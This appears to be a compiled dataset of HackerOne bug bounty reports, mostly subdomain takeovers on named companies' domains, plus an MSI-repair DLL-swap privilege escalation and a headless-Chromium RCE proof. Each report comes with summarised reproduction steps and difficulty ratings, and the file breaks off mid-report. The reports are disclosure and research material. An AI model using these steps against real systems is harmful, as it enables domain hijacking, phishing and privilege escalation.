@@ -1,0 +1,2526 @@
+Authnz NOT EASY
+==================================================
+
+Total reports analyzed: 51
+
+Privilege Escalation Vulnerabilities (31 reports)
+--------------------------------------------------
+
+Report https://hackerone.com/reports/1018790: Subdomains takeover of  register.acronis.com, promo.acronis.com, info.acronis.com and promosandbox.acronis.com
+================================================================================
+RAW DESCRIPTION:
+
+Summary:
+The Subdomains https://register.acronis.com, https://promo.acronis.com, https://info.acronis.com and https://promosandbox.acronis.com
+are vulnerable to takeover due to unclaimed marketo CNAME records. Anyone is able to own these subdomains at the moment.
+This vulnerability is called subdomain takeover. You can read more about it here:
+https://blog.sweepatic.com/subdomain-takeover-principles/
+https://hackerone.com/reports/32825
+https://hackerone.com/reports/779442
+https://hackerone.com/reports/175070
+Steps To Reproduce:
+Code 518 Bytes
+1nslookup register.acronis.com
+2Non-authoritative answer:
+3Name: sjh.mktossl.com
+4Addresses:104.17.74.206
+5          104.17.72.206
+6          104.17.70.206
+7          104.17.73.206
+8          104.17.71.206
+9Aliases:  register.acronis.com
+10          acronis.mktoweb.com
+11
+12nslookup promo.acronis.com
+13Non-authoritative answer:
+14Name:    sjh.mktossl.com
+15Addresses:  104.17.71.206
+16          104.17.70.206
+17          104.17.74.206
+18          104.17.72.206
+19          104.17.73.206
+20Aliases:  promo.acronis.com
+21          acronis.mktoweb.com
+22
+CNAMES entries to corresponding domains are as:
+Code 269 Bytes
+1promo.acronis.com                               acronis.mktoweb.com
+2promosandbox.acronis.com                   acronissandbox2.mktoweb.com
+3register.acronis.com                            acronis.mktoweb.com
+4info.acronis.com  	                             mkto-h0084.com
+As register.acronis.com and promo.acronis.com pointing to CNAME record as acronis.mktoweb.com and are aliases to acronis.mktoweb.com . http://acronis.mktoweb.com/ is giving 404, page not found with message "The requested URL was not found on this server" which can be claimed by anyone now and would result in subdomain takeover.
+The marketo document to Customize Your Landing Page URLs with a CNAME
+https://docs.marketo.com/display/public/DOCS/Customize+Your+Landing+Page+URLs+with+a+CNAME
+As marketo is a paid service and offers account for marketing automation, I don't have a registered account.
+I wrote to Marketo technical support team and they claim the availability of listed domains as the listed domains are not in use or configured anymore.
+Supporting Material/References:
+Please refer to attached screenshots.
+Impact
+With this, I can clearly see XSS impact in your case. Please have a look at your /v2/account request intercepted below:
+Request:
+Code 1.62 KiB
+1PUT /v2/account HTTP/1.1
+2Host: account.acronis.com
+3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0
+4Accept: application/json, text/plain, */*
+5Accept-Language: en-US,en;q=0.5
+6Accept-Encoding: gzip, deflate
+7Content-Type: application/json;charset=utf-8
+8Content-Length: 702
+9Origin: https://register.acronis.com
+10Connection: close
+11Referer: https://account.acronis.com/
+12Cookie: _gcl_au=1.1.36144172.1601449011; _ga=GA1.2.1290766356.1601449012; _fbp=fb.1.1601449012432.633797135; _hjid=a7dd36be-ea53-40b1-b04e-c2a96f5ebc3c; optimizelyEndUserId=oeu1601449014822r0.42778295429069313; OptanonConsent=isIABGlobal=false&datestamp=Mon+Oct+26+2020+16%3A35%3A28+GMT%2B0530+(India+Standard+Time)&version=6.6.0&hosts=&consentId=07081eac-3ae3-443d-8451-79f5327d9351&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0004%3A1%2CC0003%3A1%2CC0002%3A1&AwaitingReconsent=false&geolocation=IN%3BHR; _mkto_trk=id:929-HVV-335&token:_mch-acronis.com-1601449020651-40834; OptanonAlertBoxClosed=2020-10-26T11:05:28.204Z; visid_incap_1638029=Bol4fqOiQTKxMXB55rfSHvSPlF8AAAAAQUIPAAAAAACe+MbhqMW1sJI4dpZBH6DI; _hjTLDTest=1; nlbi_1638029=ibxAVmtdEHzy/Y9u+BxnEAAAAAB308NLs7A3ARoQwyk4Cyrg; incap_ses_745_1638029=ddKxJtFthhy2IeNut8VWCvWPlF8AAAAACuwA/vpt+9dXQmj6hoxBWQ==; _gid=GA1.2.639811834.1603690260; _gac_UA-149943-47=1.1603691724.Cj0KCQjwxNT8BRD9ARIsAJ8S5xZC0_Hlxu0wgG7xA0-jU5eIi2BxoGFsRealW_kNcbHRyB_H8h3z-y0aAjFAEALw_wcB; AcronisSID.en=8a4d91ace2ecadca23dda91cdcb5abc5; AcronisUID.en=1438137573; _hjAbsoluteSessionInProgress=1; _uetsid=6d516b50174c11eb8ef2b18637bee740; _uetvid=b490e7509541648c67826dc18a0c7c46; _gat_UA-149943-47=1
+Response:
+Code 866 Bytes
+1HTTP/1.1 200 OK
+2Server: nginx
+3Date: Mon, 26 Oct 2020 11:59:18 GMT
+4Content-Type: application/json
+5Connection: close
+6Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+7pragma: no-cache
+8expires: -1
+9X-RateLimit-Limit: 100
+10X-RateLimit-Remaining: 97
+11Access-Control-Allow-Origin: https://register.acronis.com
+12Access-Control-Allow-Credentials: true
+13Access-Control-Allow-Headers: Accept, Accept-Encoding, Accept-Language, Authorization, Cache-Control, Connection, DNT, Keep-Alive, If-Modified-Since, Origin, Save-Data, User-Agent, X-Requested-With, Content-Type
+14Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
+15p3p: CP=IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT
+16X-Frame-Options: SAMEORIGIN
+17Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+18X-XSS-Protection: 1; mode=block
+19Content-Length: 714
+See in response below,:
+Code 96 Bytes
+1Access-Control-Allow-Origin: https://register.acronis.com
+2Access-Control-Allow-Credentials: true
+Access-Control-Allow-Credentials are true for Access-Control-Allow-Origin as *.acronis.com which makes Credentials true for all subdomains of acronis.com. Cross-Origin Resource Sharing (CORS) allows cross-domain access from all subdomains of acronis.com
+Therefore, by taking over listed subdomains or finding any XSS vulnerability in any of the listed subdomains can steal user information or read arbitrary data from the accounts of other users.
+The Subdomain takeover allows various attacks.
+Malware distribution
+Phishing / Spear phishing
+XSS
+Authentication bypass
+...
+List goes on and on. Since some certificate authorities (Let's Encrypt) require only domain verification, SSL certificate can be easily generated.
+An attacker can utilize these domains for targeting the organization by fake login forms, or steal sensitive information of teams (credentials, information, etc)
+FIX & MITIGATION
+You should immediately remove the CNAME entries for these domains or point it elsewhere if you don't use marketo services.
+Please let me know if more info needed or any help.
+Best Regards,
+Ashmek
+
+
+
+================================================================================
+Vulnerability Description:
+The subdomains register.acronis.com, promo.acronis.com, info.acronis.com, and promosandbox.acronis.com are vulnerable to subdomain takeover due to unclaimed Marketo CNAME records. An attacker can claim these domains, leading to potential attacks like XSS, phishing, or malware distribution. The vulnerability is exacerbated by CORS misconfigurations that allow credential sharing across subdomains.
+
+Steps to Reproduce:
+1. Run nslookup on register.acronis.com, promo.acronis.com, info.acronis.com, and promosandbox.acronis.com to identify CNAME records pointing to Marketo services.
+2. Verify the Marketo domains (e.g., acronis.mktoweb.com) return a 404 error, indicating they are unclaimed and vulnerable to takeover.
+Exploitation Difficulty:
+The vulnerability involves identifying misconfigured DNS records and understanding the implications of unclaimed third-party services. While the steps to identify the issue are straightforward, recognizing the broader impact (e.g., CORS exploitation) requires additional insight.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/1071832: Local privilege escalation via insecure MSI file
+================================================================================
+RAW DESCRIPTION:
+
+Summary
+I've found a vulnerability which leads to a local privilege escalation starting from a non-admin user.
+When True Image client installs it drops 2 MSI files into C:\Windows\Installer folder.
+Since this folder (by default) is readable by anyone, a non-admin user can execute commands like msiexec /fa installer_name.msi, which forces installer_name.msi to "repair" the program.
+One of these 2 MSIs (i can't named it because MSI file names are random and unique for every installation) when forced to repair it creates a dll in %TEMP%\random_name and then, after some time, MsiExec.exe loads it. Since MsiExec.exe auto-escalate privileges when executed and %TEMP% is writable by anyone, this behavior could be abused to gain nt authority\system privileges.
+Steps To Reproduce
+Open %TEMP% and C:\Windows\Installer
+Locate the MSI file in the installer folder: it's 1.3 GB large and has Acronis as author
+Open cmd.exe and execute msiexec /fa C:\Windows\Installer\installer_name.msi. After few seconds a new folder will appear in %TEMP%
+Replace schedule.dll inside that folder with the schedule.dll attachment in this report
+Wait until the process finishes. After some time a UAC should prompt, just select "no"
+A new cmd should pop up. Type whoami to confirm the new privileges
+I've also recorded a PoC video in case something it's not clear.
+Recommendations
+Do not use local %TEMP% to create schedule.dll, use C:\Windows\TEMP.
+Impact
+LPEs like this one are often used by malwares to evade antivirus engines, install rootkits, spread over the network, etc...
+A malware author could use this exploit to target Acronis end users.
+
+
+
+================================================================================
+Vulnerability Description:
+A local privilege escalation vulnerability exists in the True Image client installation process. The installer drops MSI files in a world-readable directory (C:\Windows\Installer), allowing non-admin users to trigger a repair operation that creates and loads a DLL from a writable location (%TEMP%). Since MsiExec.exe auto-escalates privileges, this can be exploited to gain SYSTEM privileges by replacing the DLL with a malicious one.
+
+Steps to Reproduce:
+1. Open %TEMP% and C:\Windows\Installer
+2. Locate the MSI file in the installer folder: it's 1.3 GB large and has Acronis as author
+3. Open cmd.exe and execute msiexec /fa C:\Windows\Installer\installer_name.msi
+4. After few seconds a new folder will appear in %TEMP%
+5. Replace schedule.dll inside that folder with a malicious schedule.dll
+6. Wait until the process finishes. After some time a UAC should prompt, just select 'no'
+7. A new cmd should pop up. Type whoami to confirm the new privileges
+Exploitation Difficulty:
+The vulnerability involves understanding the MSI repair mechanism, the auto-escalation behavior of MsiExec.exe, and the writable nature of %TEMP%. While these components are known in security research, putting them together to exploit the vulnerability requires some insight into Windows installer behavior and privilege escalation techniques.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/1168765: RCE hazard in reporting (via Chromium)
+================================================================================
+RAW DESCRIPTION:
+
+Summary: Reporting embeds a Chromium that is susceptible to RCEs
+Description:
+Reporting uses a headless Chromium to generate PNGs and PDFs. This is invoked (at least on Elastic Cloud, ECE and ECK) with --no-sandbox to work at all.
+There are RCEs readily available for Chrome, and at least the versions shipped with 7.11 and 7.12 are susceptible to the attached example.
+Attached is an adaptation of this exploit: https://github.com/rapid7/metasploit-framework/pull/15007/files#diff-42ae645fcacbd90d93296471ac57e1d734544af7fb082efd607db0a29d197ac4R53
+I have not been able to devise a complete chain yet (thus the "hazard"), but anything that enables pointing reporting at attacker-controlled JS would be able to pop an RCE this way. HTML-injection or XSS (even with the CSP a HTML injection will enable a redirect) or an open redirect would enable pointing reporting at custom JS code.
+Steps To Reproduce:
+Host the attached HTML somewhere, in my case it's available on http://192.168.0.154:8009/alexb-says-hi.html
+Point the x-pack reporting-embedded Chromium at it (this step is missing to complete the chain)
+Here's an example. The attached HTML file gets uname -a > /tmp/alexb-says-hi to be run:
+Code 924 Bytes
+1$ docker run --rm -it docker.elastic.co/kibana/kibana:7.12.0 bash  
+2bash-4.4$ cd ./x-pack/plugins/reporting/chromium/headless_shell-linux_x64/
+3bash-4.4$ ls /tmp/
+4ks-script-esd4my7v  ks-script-eusq_sc5
+5bash-4.4$ ./headless_shell --no-sandbox http://192.168.0.154:8009/alexb-says-hi.html
+6[0419/161441.709455:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale
+7[0419/161441.725018:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale
+8[0419/161441.727174:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale
+9[0419/161441.821129:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale
+10^C # CTRL-C after a few seconds. Reporting would kill it after a timeout
+11bash-4.4$ ls /tmp/
+12alexb-says-hi  ks-script-esd4my7v  ks-script-eusq_sc5
+13bash-4.4$ cat /tmp/alexb-says-hi
+14Linux bd1b285e33b7 4.19.121-linuxkit #1 SMP Thu Jan 21 15:36:34 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+Supporting Material/References:
+HTML-file which when accessed via Reporting's headless Chromium triggers an RCE. (Steps to produce that file via msfconsole is embedded in the HTML file as comments)
+Impact
+Kibana is an HTML-injection (even without full-blown XSS) or an open redirect away from being RCE-able via Reporting.
+
+
+
+================================================================================
+Vulnerability Description:
+The vulnerability involves Kibana's reporting feature using a headless Chromium instance with the --no-sandbox flag, making it susceptible to Remote Code Execution (RCE) if an attacker can control the JavaScript executed by Chromium. This could be achieved through HTML injection, XSS, or open redirect vulnerabilities in Kibana.
+
+Steps to Reproduce:
+1. Host the malicious HTML file on a server accessible by the target system
+2. Configure Kibana's reporting feature to use the headless Chromium with --no-sandbox flag
+3. Point the reporting feature to the hosted malicious HTML file
+4. Observe the execution of arbitrary commands on the system
+Exploitation Difficulty:
+The attack requires understanding of Chromium's sandboxing mechanisms, the implications of the --no-sandbox flag, and how to craft malicious JavaScript to exploit this configuration. Additionally, the attacker needs to find a way to inject or redirect to their malicious content within Kibana's context, which adds to the complexity.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/1197013: Subdomain takeover of ████.jitsi.net
+================================================================================
+RAW DESCRIPTION:
+
+Summary
+█████.jitsi.net points to an AWS EC2 instance at 18.195.93.116 that no longer exists. I was able to take control of this IP address and run my own EC2 instance. I can now serve content on this domain, obtain a TLS certificate for this domain, etc.
+If any customers or servers are pointing to anything within this domain, I could serve them arbitrary/malicious content. I could also use this in case your domain whitelists your own domain for OAuth, or if there are cookies scoped to the entire domain. Usually this can have a high impact.
+Code 99 Bytes
+1% dig +short ██████.jitsi.net
+218.195.93.116
+3
+4% curl ██████████.jitsi.net
+5<!-- hackerone.com/ian -->
+Impact
+Subdomain takeover
+
+
+
+================================================================================
+Vulnerability Description:
+The subdomain ████.jitsi.net points to an AWS EC2 instance that no longer exists. An attacker can take control of this IP address by launching their own EC2 instance, thereby serving malicious content, obtaining TLS certificates, and potentially exploiting domain-wide OAuth or cookie scoping.
+
+Steps to Reproduce:
+1. Use dig to check the DNS records for the subdomain: dig +short ██████.jitsi.net
+2. Attempt to access the subdomain via curl: curl ██████████.jitsi.net
+Exploitation Difficulty:
+The vulnerability involves straightforward steps of checking DNS records and verifying the availability of the subdomain. The attack does not require complex interactions or manipulation of application states, nor does it involve novel logic.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/1294492: DNS Miconfiguration Leads to Subdomain Takeover  - max1.liveplan.com
+================================================================================
+RAW DESCRIPTION:
+
+Summary
+The issue happens due to using EC2 public DNS instead of using Elastic IPs as CNAME record. This report is simliar to report #1069795
+Misconfiguration
+DNS Records
+Code 264 Bytes
+1{
+2  "host": "max1.liveplan.com",
+3  "resolver": [
+4    "1.0.0.1:53"
+5  ],
+6  "a": [
+7    "54.68.121.128"
+8  ],
+9  "cname": [
+10    "ec2-54-68-121-128.us-west-2.compute.amazonaws.com"
+11  ],
+12  "status_code": "NOERROR",
+13  "timestamp": "2021-08-07T13:41:48.3522806+02:00"     
+14}
+If the EC2 instance is killed or terminated and the DNS was not updated this will lead to creating a dangling DNS record for the subdomain.
+The EC2 IP will be released to AWS IPs pool, This mean it's possible to assign the IP to new EC2 instance.
+PoC
+SSL Certificate Data pulled from https://max1.liveplan.com on date 7/8/2021 - 1:40PM.
+Data was pulled using SSLEnum
+Code 198 Bytes
+1{
+2  "name": "max1.liveplan.com",
+3  "org": [],
+4  "cn": [
+5    "*.test.tugo.com"
+6  ],
+7  "alt_doms": [
+8    "*.test.tugo.com",        
+9    "*.dev.tugo.com",
+10    "*.uat.tugo.com"
+11  ],
+12  "dangling": true
+13}
+This does prove that max1.liveplan.com is currently taken over by someone.
+<image_0>
+Fix
+Use Elastic IPs instead of the public DNS of EC2 instance or clear DNS records for mentioned subdomain
+Supporting Material/References:
+https://blog.melbadry9.xyz/dangling-dns/aws/ddns-ec2-current-state
+Impact
+This could allow the takeover of the EC2 instance IP that will lead to subdomain takeover.
+
+
+
+================================================================================
+Vulnerability Description:
+The vulnerability arises from a DNS misconfiguration where a subdomain (max1.liveplan.com) uses an EC2 public DNS as a CNAME record instead of an Elastic IP. If the EC2 instance is terminated, the DNS record becomes dangling, allowing an attacker to claim the IP and take over the subdomain. This is confirmed by the SSL certificate data showing unrelated domains, indicating a successful takeover.
+
+Steps to Reproduce:
+1. Identify the subdomain max1.liveplan.com and check its DNS records.
+2. Verify that the CNAME record points to an EC2 public DNS (ec2-54-68-121-128.us-west-2.compute.amazonaws.com) instead of an Elastic IP.
+3. Check if the EC2 instance associated with the DNS record is terminated or the IP is reassigned.
+4. Confirm the subdomain takeover by analyzing the SSL certificate data from https://max1.liveplan.com, which shows unrelated domains (e.g., *.test.tugo.com).
+Exploitation Difficulty:
+The vulnerability involves understanding DNS configurations, EC2 instance lifecycle, and the implications of dangling DNS records. However, the steps to identify and exploit this issue are straightforward and well-documented, making the discovery process less complex.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/1296366: EC2 subdomain takeover at http://████████/
+================================================================================
+RAW DESCRIPTION:
+
+There is a dangling DNS A record that points to an EC2 instance that no longer exists, I was able to claim the EC2 instance and host content on http://███████/.
+Steps To Reproduce:
+Visit http://█████████/██████████.html and view the PoC: ██████
+Suggested Remediation Steps
+Remove the A record pointing to the current ec2 instance.
+Impact
+Hosting content on http://█████/ and potentionally fully bypassing web protections like CORS (in cases of ████████) or redirecting users to malicious pages.
+Impact
+Hosting content on http://██████/ and potentionally fully bypassing web protections like CORS (in cases of ██████████) or redirecting users to malicious pages,
+System Host(s)
+██████
+Affected Product(s) and Version(s)
+CVE Numbers
+Steps to Reproduce
+Visit http://██████████/█████.html and view the PoC: █████
+Suggested Mitigation/Remediation Actions
+Remove the A record pointing to the current ec2 instance.
+
+
+
+================================================================================
+Vulnerability Description:
+A dangling DNS A record points to an EC2 instance that no longer exists, allowing an attacker to claim the instance and host malicious content on the subdomain.
+
+Steps to Reproduce:
+1. Visit the subdomain http://█████████/ to check if it resolves to an EC2 instance.
+2. If the EC2 instance is no longer active, claim the instance by registering it in your AWS account and host content to demonstrate the takeover.
+Exploitation Difficulty:
+The attack involves identifying a dangling DNS record and claiming the associated EC2 instance, which is a straightforward process once the dangling record is discovered. There are no complex interactions or novel logic involved.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/1341133: Subdomain takeover [​████████]
+================================================================================
+RAW DESCRIPTION:
+
+The subdomain ███████ was pointing to an Azure Cloud App domain (araz-sp.centralus.cloudapp.azure.com), but that endpoint was not registered.
+Impact
+It's extremely vulnerable to attacks as a malicious user could create any web page with any content and host it on the vulnerable domain. This would allow them to post malicious content which would be mistaken for a valid site.
+They could perform several attacks like:
+Cookie Stealing
+Phishing campaigns.
+Bypass Content-Security Policies and CORS.
+Recommendations for fix
+Remove the affected DNS record if not used
+Supporting Material/References:
+https://0xpatrik.com/subdomain-takeover/
+https://hackerone.com/reports/661751
+System Host(s)
+███████
+Affected Product(s) and Version(s)
+CVE Numbers
+Steps to Reproduce
+Just go to
+http://████████
+You will see a blank page, but checking the source code you will see proof of the take over.
+Code 42 Bytes
+1<html>  
+2<!-- poc by deleite --> 
+3 </html>
+Suggested Mitigation/Remediation Actions
+
+
+
+================================================================================
+Vulnerability Description:
+The subdomain was pointing to an unregistered Azure Cloud App domain, making it vulnerable to takeover. An attacker could host malicious content on the domain, enabling attacks like cookie stealing, phishing, or bypassing security policies.
+
+Steps to Reproduce:
+1. Navigate to the subdomain (http://████████) and observe a blank page.
+2. Inspect the page source to confirm the presence of the takeover proof (e.g., '<!-- poc by deleite -->').
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it only requires checking the DNS records and verifying the subdomain's response. There are no complex interactions or states involved.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/1718371: Subdomain takeover at http://test.www.midigator.com
+================================================================================
+RAW DESCRIPTION:
+
+Vulnerability
+Subdomain test.www.midigator.com points to an AWS S3 bucket that no longer exists. I was able to take control of this bucket and serve my own content on it.
+Proof Of Concept
+Code 315 Bytes
+1$ dig test.www.midigator.com
+2[snipped]
+3;; ANSWER SECTION:
+<image_0>
+<image_1>
+<image_2>
+<image_3>
+Remediation
+Remove the CNAME entry for the test.www.midigator.com
+Impact
+Subdomain Takeover
+
+
+
+================================================================================
+Vulnerability Description:
+The subdomain test.www.midigator.com was pointing to an AWS S3 bucket that no longer existed, allowing an attacker to claim the bucket and serve malicious content. This is a classic subdomain takeover vulnerability.
+
+Steps to Reproduce:
+1. Use the dig command to check the DNS records for test.www.midigator.com
+2. Verify that the subdomain points to an AWS S3 bucket that no longer exists
+3. Claim the abandoned S3 bucket and serve custom content
+Exploitation Difficulty:
+This vulnerability is straightforward to discover as it only requires checking DNS records and verifying the availability of the referenced S3 bucket. There are no complex interactions or state manipulations involved.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/186766: Subdomain takeover on happymondays.starbucks.com due to non-used AWS S3 DNS record
+================================================================================
+RAW DESCRIPTION:
+
+Hi,
+<image_0>
+<image_1>
+As you might consider, the impact of this are pretty significant. I now can publish whatever I want on this domain, even fetching httpOnly cookies. I would also be able to register SSL certificate for this domain through Let's Encrypt (it is only need meta/file verification to issue the certificate) That would end up with the ability to read secure cookies as well.
+In addition, there's no way at all for a visitor of this page to validate that the content on this domain is not served by Starbucks, making it extremely easy to utilize this for targeting the organization by fake login forms / spear phishing using your own domain to plant the attack.
+Cheers,
+Danil
+
+
+
+================================================================================
+Vulnerability Description:
+The vulnerability involves a subdomain takeover of happymondays.starbucks.com due to an unused AWS S3 DNS record. This allows an attacker to host malicious content on the domain, potentially leading to phishing attacks, cookie theft, and unauthorized SSL certificate issuance.
+
+Steps to Reproduce:
+1. Identify the subdomain happymondays.starbucks.com and check its DNS records.
+2. Observe that the DNS record points to an unused AWS S3 bucket, indicating a potential subdomain takeover.
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it primarily involves checking DNS records and identifying unused AWS S3 buckets. There are no complex interactions or novel logic involved.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/193056: Subdomain Takeover at http://gameday.websummit.net
+================================================================================
+RAW DESCRIPTION:
+
+As i said in the title i found a subdomain takeover vulnerability on the url http://gameday.websummit.net
+The url was trying to find a bucket that didn't exist from a probably forgotten dns entry that was at
+<image_0>
+So i created a bucket with the specified name and uploaded a poc.
+POC in the pictures
+For more infos please ask...
+
+
+
+================================================================================
+Vulnerability Description:
+The vulnerability involves a subdomain takeover where a DNS entry points to a non-existent cloud storage bucket. An attacker can claim this bucket by creating it with the same name, thereby gaining control over the subdomain and potentially serving malicious content or phishing pages.
+
+Steps to Reproduce:
+1. Identify a subdomain (e.g., gameday.websummit.net) that points to a non-existent cloud storage bucket or service.
+2. Create a bucket with the same name as the one the subdomain was trying to access and upload a proof-of-concept (POC) file to demonstrate the takeover.
+Exploitation Difficulty:
+The attack is straightforward and involves minimal components: identifying a misconfigured DNS entry and creating a corresponding cloud storage bucket. There are no complex interactions or state manipulations required.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/264494: Subdomain Takeover at creatorforum.roblox.com
+================================================================================
+RAW DESCRIPTION:
+
+Hello.
+A few days ago, I was looking at Roblox subdomains, and I noticed an unusual one called creatorforum.roblox.com. Upon further investigation, I visited it and saw that creatorforum.roblox.com's CNAME was a nonexistant Discourse website.
+I immediately reported to info@roblox.com, and eventually talked to Antek Baranski on the bugbounty@roblox.com email address. The issue has been fixed since reporting, but I was told to send a report here.
+If I had a Discourse account, I could've taken over the CNAME for creatorforum.roblox.com and then it would've been a full subdomain takeover on that subdomain.
+As mentioned earlier in the report, the issue has been resolved and as you can see the subdomain creatorforum.roblox.com no longer exists.
+Thanks,
+Jack
+
+
+
+================================================================================
+Vulnerability Description:
+The subdomain creatorforum.roblox.com had a CNAME record pointing to a non-existent Discourse website, which could have been exploited by registering the Discourse account associated with the subdomain, leading to a subdomain takeover.
+
+Steps to Reproduce:
+1. Identify the subdomain creatorforum.roblox.com by examining Roblox's subdomains.
+2. Check the CNAME record of creatorforum.roblox.com and notice it points to a non-existent Discourse website.
+Exploitation Difficulty:
+The vulnerability involves a straightforward check of subdomain DNS records and recognizing a misconfigured CNAME. The steps are simple and do not require complex interactions or novel logic.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/304378: ACME TLS-SNI-01/02 challenge vulnerable when combined with shared hosting providers
+================================================================================
+RAW DESCRIPTION:
+
+The ACME TLS-SNI-01 (and TLS-SNI-02) specification assumed wrong in terms of how current major cloud providers routed and validated domains. This was reported earlier this week to Let's Encrypt, and they decided to disable the method. Today Let's Encrypt decided to sunset both TLS-SNI-01 and TLS-SNI-02 due to the vulnerability I found.
+A full writeup of the finding and my side of the timeline can be found here:
+How I exploited ACME TLS-SNI-01 issuing Let's Encrypt SSL-certs for any domain using shared hosting
+Here is Let's Encrypt first and second announcement about the reported issue:
+2018.01.09 Issue with TLS-SNI-01 and Shared Hosting Infrastructure
+2018.01.11 Update Regarding ACME TLS-SNI and Shared Hosting Infrastructure
+Regards,
+Frans
+Impact
+The ability to issue SSL-certificates for domains not under the attacker's control but served using the same shared hosting provider.
+
+
+
+================================================================================
+Vulnerability Description:
+The ACME TLS-SNI-01 and TLS-SNI-02 challenges were vulnerable to exploitation when used with shared hosting providers. The vulnerability allowed an attacker to issue SSL certificates for domains not under their control but served by the same shared hosting provider, due to incorrect assumptions about how cloud providers routed and validated domains.
+
+Steps to Reproduce:
+1. Identify a shared hosting provider that serves multiple domains under the same IP address.
+2. Use the ACME TLS-SNI-01/02 challenge to request a certificate for a target domain hosted on the same shared hosting provider.
+3. Exploit the shared hosting provider's routing mechanism to validate the challenge for the target domain, thereby obtaining a certificate for a domain not under your control.
+Exploitation Difficulty:
+The vulnerability involves understanding the ACME protocol's TLS-SNI challenges, the routing mechanisms of shared hosting providers, and the subtle interaction between these components that allows for certificate issuance bypass. The attack requires manipulating the validation process in a non-obvious way by leveraging shared infrastructure.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/325336: Subdomain takeover on svcgatewayus.starbucks.com
+================================================================================
+RAW DESCRIPTION:
+
+Hello,
+this is pretty serious security issue in some context, so please act as fast as possible.
+Overview:
+One of the starbucks.com subdomains is pointing to Azure, which has unclaimed CNAME record. ANYONE is able to own starbucks.com subdomain at the moment.
+This vulnerability is called subdomain takeover. You can read more about it here:
+https://blog.sweepatic.com/subdomain-takeover-principles/
+https://hackerone.com/reports/32825
+https://hackerone.com/reports/175070
+https://hackerone.com/reports/172137
+Details:
+svcgatewayus.starbucks.com has CNAME to s00197tmp0crdfulprod0.trafficmanager.net which has CNAME to 1fd05821-7501-40de-9e44-17235e7ab48b.cloudapp.net. However, 1fd05821-7501-40de-9e44-17235e7ab48b.cloudapp.net is not registered in Azure cloud anymore and thus can be registered by anyone. After registering the Cloud App in Azure portal, the person doing so has full control over content on svcgatewayus.starbucks.com.
+PoC:
+http://svcgatewayus.starbucks.com
+ Mitigation:
+Remove the CNAME record from starbucks.com DNS zone completely.
+Claim it back in Azure portal after I release it
+Regards,
+Patrik Hudak
+Impact
+Subdomain takeover is abused for several purposes:
+Malware distribution
+Phishing / Spear phishing
+XSS
+Authentication bypass
+...
+List goes on and on. Since some certificate authorities (Let's Encrypt) require only domain verification, SSL certificate can be easily generated.
+
+
+
+================================================================================
+Vulnerability Description:
+The subdomain svcgatewayus.starbucks.com has a CNAME record pointing to an unclaimed Azure resource. This allows anyone to register the resource in Azure and take control of the subdomain, leading to potential misuse such as malware distribution, phishing, or other malicious activities.
+
+Steps to Reproduce:
+1. Identify the subdomain svcgatewayus.starbucks.com and check its DNS records.
+2. Verify that the CNAME record points to an unclaimed Azure resource (s00197tmp0crdfulprod0.trafficmanager.net and subsequently to 1fd05821-7501-40de-9e44-17235e7ab48b.cloudapp.net).
+3. Register the unclaimed Azure resource (1fd05821-7501-40de-9e44-17235e7ab48b.cloudapp.net) in the Azure portal.
+4. Once registered, gain control over the content served on svcgatewayus.starbucks.com.
+Exploitation Difficulty:
+The vulnerability involves checking DNS records and identifying unclaimed cloud resources, which is a straightforward process for someone familiar with DNS and cloud services. The steps are linear and do not require complex interactions or novel logic.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/383564: Subdomain takeover on svcgatewaydevus.starbucks.com and svcgatewayloadus.starbucks.com
+================================================================================
+RAW DESCRIPTION:
+
+Hello,
+This is fairly close to this report however these are different subdomains than the one in the report.
+This can be pretty serious since I can server virtually anything I want. In the 45 minutes I've held the domain I have served to 341 unique IP addresses.
+Two starbucks.com subdomains are pointed to Azure with an unclaimed CNAME record. Anyone would be able to serve content on these subdomains.
+svcgatewayloadus.starbucks.com
+Code 482 Bytes
+1;; Server: 1.1.1.1:53
+2;; Size: 191
+3;; Unix time: 1531965036
+4;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 3697
+5;; flags: qr rd ra ; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 0
+6
+7;; QUESTION SECTION:
+8svcgatewayloadus.starbucks.com. IN A
+9
+10;; ANSWER SECTION:
+11svcgatewayloadus.starbucks.com. 600 IN CNAME s00197tmp0crdfulload0.trafficmanager.net.
+12
+13;; AUTHORITY SECTION:
+14trafficmanager.net. 30 IN SOA tm1.msft.net. hostmaster.trafficmanager.net. 2003080800 900 300 2419200 30
+15
+svcgatewaydevus.starbucks.com
+Code 742 Bytes
+1;; Server: 9.9.9.9:53
+2;; Size: 156
+3;; Unix time: 1531965036
+4;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 47788
+5;; flags: qr rd ra ; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 0
+6
+7;; QUESTION SECTION:
+8svcgatewaydevus.starbucks.com. IN A                                                                                                                                                            
+9
+10;; ANSWER SECTION:
